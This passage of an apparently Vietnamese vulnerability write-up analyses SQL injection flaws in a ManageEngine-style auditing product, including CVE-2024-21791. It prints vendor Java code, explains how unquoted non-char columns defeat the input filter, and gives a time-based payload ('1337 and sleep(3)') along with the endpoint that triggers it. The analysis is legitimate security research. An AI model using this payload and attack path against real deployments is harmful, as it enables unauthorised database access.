+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">HashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">hashMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">hashMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;DOMAIN_NAME&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">domainName</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">queryStr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ADAPSQLQueryAPI</span><span class="p">.</span><span class="na">getInstance</span><span class="p">().</span><span class="na">getSQLCountString</span><span class="p">(</span><span class="n">cvId</span><span class="p">,</span><span class="w"> </span><span class="n">searchCriteria</span><span class="p">,</span><span class="w"> </span><span class="n">hashMap</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">rowsCount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">QueryUtil</span><span class="p">.</span><span class="na">getRowsCount</span><span class="p">(</span><span class="n">queryStr</span><span class="p">);</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>Hàm <code>ADAPSQLQueryAPI.getInstance().getSQLCountString()</code> có nhiệm vụ là construct một sql query từ các params đầu vào để tạo thành một câu truy vấn hoàn chỉnh, sau đó đặt vào hàm <code>QueryUtil.getRowsCount()</code> để thực thi.</p>
+<p>Call stack:</p>
+<pre tabindex="0"><code>com.adventnet.sym.adsm.common.server.sql.QueryUtil::getRowsCount()
+com.adventnet.sym.adsm.auditing.server.fileanalysis.FileAnalysisServerHandler::getCount()
+com.adventnet.sym.adsm.auditing.server.fileanalysis.FileAnalysisServerHandler::getConfiguredServersCount()
+com.adventnet.sym.adsm.auditing.webclient.ember.api.fileanalysis.FileAnalysisHandler::getFileServers() [private static]
+com.adventnet.sym.adsm.auditing.webclient.ember.api.fileanalysis.FileAnalysisHandler::getFileServers() [plubic void]
+...
+</code></pre><h3 id="cve-2024-21791">#CVE-2024-21791<a hidden class="anchor" aria-hidden="true" href="#cve-2024-21791">#</a></h3>
+<p>Trên là một lỗ hổng SQL injection tương đối dễ thấy và cơ bản khi review source code, còn về CVE-2024-21791 thì cách tiếp cận của mình khi tìm ra bug này thì về cơ bản vẫn như bug trước, nghĩa là vẫn theo dõi flow-code, tìm ra các sink rồi trace ngược về tìm source. Nhưng đáng chú ý là ở phần này mình đã bỏ qua nhiều lần khi review source-code vì cứ ngỡ rằng không thể bypass, cũng may mắn là mình đã quyết định đi sâu vào phân tích thì nhận ra có một lỗ hổng trong hàm filter input, hàm này được thiết kế để phòng tránh sql injection.</p>
+<p>Root cause của lỗ hổng này là sự nhầm lẫn trong quá trình biến đổi input lồng nhau giữa hai hàm <code>CommonUtil.getSearchString()</code> và hàm <code>ReportHandlerUtil.getSearchString()</code>. Cụ thể như sau:</p>
+<p>Hàm <code>CommonUtil.getSearchString()</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// class CommonUtil</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getSearchString</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">value</span><span class="p">,</span><span class="w"> </span><span class="n">Boolean</span><span class="w"> </span><span class="n">escape</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">escape</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">EscapeUtil</span><span class="p">.</span><span class="na">escSplCharsAsSQLForLike</span><span class="p">(</span><span class="n">value</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">value</span><span class="p">.</span><span class="na">length</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">len</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">1</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">value</span><span class="p">.</span><span class="na">charAt</span><span class="p">(</span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="sc">&#39;\\&#39;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">len</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">2</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">value</span><span class="p">.</span><span class="na">charAt</span><span class="p">(</span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;*&#39;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">value</span><span class="p">.</span><span class="na">charAt</span><span class="p">(</span><span class="n">len</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">1</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;*&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">value</span><span class="p">.</span><span class="na">substring</span><span class="p">(</span><span class="n">1</span><span class="p">,</span><span class="w"> </span><span class="n">len</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">1</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;%&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;%&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">value</span><span class="p">.</span><span class="na">charAt</span><span class="p">(</span><span class="n">len</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">1</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;*&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">value</span><span class="p">.</span><span class="na">substring</span><span class="p">(</span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">len</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">1</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;%&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">value</span><span class="p">.</span><span class="na">charAt</span><span class="p">(</span><span class="n">len</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">1</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;%&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">value</span><span class="p">.</span><span class="na">substring</span><span class="p">(</span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">len</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">1</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;%&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">value</span><span class="p">.</span><span class="na">charAt</span><span class="p">(</span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;*&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">value</span><span class="p">.</span><span class="na">substring</span><span class="p">(</span><span class="n">1</span><span class="p">,</span><span class="w"> </span><span class="n">len</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;%&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">value</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;%&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;%&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;%&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;%&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">value</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>chủ yếu thực hiện vô hiệu hóa các ký tự đặc biệt (special chars) của input nếu <code>escape=True</code> bằng hàm <code>EscapeUtil.escSplCharsAsSQLForLike()</code> và đồng thời format lại input dưới dạng <code>%…%</code>, bởi vì đây là dữ liệu dùng để tìm kiếm ở where clause nên thường đặt bên trong cặp dấu <code>%%</code></p>
+<p>Và hàm <code>ReportHandlerUtil.getSearchString()</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// class ReportHandlerUtil</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getSearchString</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">columnName</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">val</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">dataType</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">dataType</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">columnName</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34; LIKE &#39;&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">val</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;&#39;&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">dataType</span><span class="p">.</span><span class="na">toLowerCase</span><span class="p">().</span><span class="na">indexOf</span><span class="p">(</span><span class="s">&#34;char&#34;</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="o">-</span><span class="n">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">columnName</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34; LIKE &#39;&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">val</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;&#39;&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">val</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">val</span><span class="p">.</span><span class="na">replaceAll</span><span class="p">(</span><span class="s">&#34;%&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">columnName</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34; = &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">val</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>thực hiện hoàn chỉnh LIKE clause, ở đây ta chú ý rằng nếu kiểu dữ liệu của columnName là một trong hai dạng là null hoặc dạng bất kỳ của kiểu char thì value sẽ được đặt vào trong cặp dấu nháy đơn (‘), còn lại thì không.</p>
+<p>Context cơ bản là như sau:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">search_value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">String</span><span class="w"> </span><span class="n">column_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="o">[</span><span class="n">1</span><span class="o">]</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">String</span><span class="w"> </span><span class="n">searchCriteria</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">String</span><span class="w"> </span><span class="n">column_data_type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getColumnDataType</span><span class="p">(</span><span class="n">column_name</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">searchCriteria</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ReportHandlerUtil</span><span class="p">.</span><span class="na">getSearchString</span><span class="p">(</span><span class="n">column_name</span><span class="p">,</span><span class="w"> </span><span class="n">CommonUtil</span><span class="p">.</span><span class="na">getSearchString</span><span class="p">(</span><span class="n">search_value</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">),</span><span class="w"> </span><span class="n">column_data_type</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">String</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;SELECT * FROM users WHERE &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">searchCriteria</span><span class="w">
+</span></span></span></code></pre></div><p>Về cơ bản input đã bị escape thông qua hàm <code>EscapeUtil.escSplCharsAsSQLForLike()</code> bên trong hàm <code>CommonUtil.getSearchString()</code> vì thế nên một số ký tự như dấu nháy đơn (‘), dấu nháy kép (“), dấu backslash (), … đều không sử dụng được.</p>
+<p>Cho nên vấn đề ở đây là, nếu ta tìm được một columnName có kiểu dữ liệu khác null và char (chẳng hạn như int) thì value sẽ không bị nhốt trong cặp dấu nháy đơn (‘) và dẫn đến có thể bypass sql injection.</p>
+<p>Example:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">search_value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;*1337 and sleep(3)*&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">String</span><span class="w"> </span><span class="n">searchCriteria</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">searchCriteria</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CommonUtil</span><span class="p">.</span><span class="na">getSearchString</span><span class="p">(</span><span class="n">search_value</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// Output =&gt; %1337 and sleep(3)%</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">String</span><span class="w"> </span><span class="n">column_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;id&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">String</span><span class="w"> </span><span class="n">column_data_type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getColumnDataType</span><span class="p">(</span><span class="n">column_name</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// Output =&gt; column_data_type = &#34;INT&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">searchCriteria</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ReportHandlerUtil</span><span class="p">.</span><span class="na">getSearchString</span><span class="p">(</span><span class="n">column_name</span><span class="p">,</span><span class="w"> </span><span class="n">searchCriteria</span><span class="p">,</span><span class="w"> </span><span class="n">column_data_type</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// Output =&gt; searchCriteria = &#34;id = 1337 and sleep(3)&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">String</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;SELECT * FROM users WHERE &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">searchCriteria</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// Output =&gt; query = &#34;SELECT * FROM users WHERE id = 1337 and sleep(3)&#34;</span><span class="w">
+</span></span></span></code></pre></div><p>Lỗ hổng này có thể được trigger thông qua <code>/api/json/report/getLockoutHistoryData</code> endpoint, lúc này sẽ gọi hàm <code>getLockoutHistoryData()</code> của class <code>com.adventnet.sym.adsm.auditing.webclient.ember.api.report.SubReportHandler</code> như sau:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">getLockoutHistoryData</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">reportReqData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">JSONObject</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;JSONString&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">reportInputParams</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">reportReqData</span><span class="p">.</span><span class="na">getJSONObject</span><span class="p">(</span><span class="s">&#34;inputParams&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Long</span><span class="w"> </span><span class="n">reportId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">reportReqData</span><span class="p">.</span><span class="na">getLong</span><span class="p">(</span><span class="s">&#34;reportId&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">tabType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">reportInputParams</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&#34;tabType&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">tabType</span><span class="p">.</span><span class="na">equalsIgnoreCase</span><span class="p">(</span><span class="s">&#34;ws&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// ...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">tabType</span><span class="p">.</span><span class="na">equalsIgnoreCase</span><span class="p">(</span><span class="s">&#34;dc&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// ...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">columnList</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ReportUtil</span><span class="p">.</span><span class="na">getInstance</span><span class="p">().</span><span class="na">getVisibleColumnList</span><span class="p">(</span><span class="n">reportcvId</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="n">rb</span><span class="p">);</span><span class="w"> </span><span class="p">(</span><span class="n">1</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">searchCriteria</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ReportHandler</span><span class="p">.</span><span class="na">getInstance</span><span class="p">().</span><span class="na">getSearchCriteria</span><span class="p">(</span><span class="n">reportInputParams</span><span class="p">,</span><span class="w"> </span><span class="n">columnList</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span><span class="w"> </span><span class="p">(</span><span class="n">2</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// ...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>Nôm na là hàm này nhận inputParams từ JSON object được parse từ JSONString bên trong request body, có hai tham số cần lưu ý là <code>reportId</code> và <code>tabType</code>, để trigger được lỗi mình sẽ đi vào nhánh <code>tabType=”dc”</code>.</p>
+<ul>
+<li>Tại (1), biến <code>columnList</code> sẽ lưu giữ danh sách các tên cột dựa vào tham số <code>reportcvId</code> mà ta truyền vào.</li>
+<li>Và (2), biến <code>searchCriteria</code> sẽ chứa câu điều kiện mà sau này sẽ được nối trực tiếp vào câu truy vấn (nguyên nhân dẫn đến SQL injection) để thực hiện lọc kết quả và hàm <code>ReportHandler.getInstance().getSearchCriteria()</code> nhận vào hai tham số ta có thể control được là <code>columnList</code> và <code>reportInputParams</code>.</li>
+</ul>
+<p>Hàm <code>ReportHandler.getSearchCriteria()</code> cơ bản như sau:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getSearchCriteria</span><span class="p">(</span><span class="n">JSONObject</span><span class="w"> </span><span class="n">reportReqData</span><span class="p">,</span><span class="w"> </span><span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">HashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">tableAllColumnList</span><span class="p">,</span><span class="w"> </span><span class="n">Boolean</span><span class="w"> </span><span class="n">needSearchCriteria</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// ...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">reportReqData</span><span class="p">.</span><span class="na">has</span><span class="p">(</span><span class="s">&#34;searchData&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">searchData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">reportReqData</span><span class="p">.</span><span class="na">getJSONObject</span><span class="p">(</span><span class="s">&#34;searchData&#34;</span><span class="p">);</span><span class="w"> </span><span class="p">(</span><span class="n">3</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Iterator</span><span class="w"> </span><span class="n">var6</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tableAllColumnList</span><span class="p">.</span><span class="na">iterator</span><span class="p">();</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
